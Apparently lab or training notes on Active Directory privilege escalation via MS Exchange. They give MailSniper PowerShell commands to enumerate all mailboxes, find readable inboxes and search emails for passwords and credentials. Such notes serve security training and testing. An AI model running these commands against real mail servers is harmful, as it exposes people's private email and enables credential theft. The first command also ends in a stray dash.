# Domain Privilege Escalation [ MS Exchange ]
## Methodology/Steps

> 1. Load in [MailSniper](https://github.com/dafthack/MailSniper) using powershell
> 2. Enumerate and pull all the emails
> 3. Save all the emails in a file called emails.txt
> 4. Now check if you have access to any other emailboxes
> 5. Check for data inside the email address where the body contains data like password or creds

---

## MailSniper

### 1. Enumerate all mailboxes 
```powershell
Get-GlobalAddressList -ExchHostname us-exchange -verbose -UserName us\studentuser1 -password <password> -
```

### 2. Enumerate all mailboxes we have access to (means current user)
```powershell
Invoke-OpenInboxFinder -EmailList C:\AD\Tools\emails.txt -ExchHostname us-exchange -verbose 
```

### 3. Once we have identified mailboxes where we can read emails, use the following to read emails. The below command looks for terms like pass, creds, credentials from top 100 emails of :
```powershell
Invoke-SelfSearch -Mailbox pwnadmin@techcorp.local -ExchHostname us-exchange -OutputCsv .\mail.csv
```

> Alternatively, using exchange manager (Organization Management) or exchange user (Exchange Trusted Subsystem) privileges also allows us to read the emails!

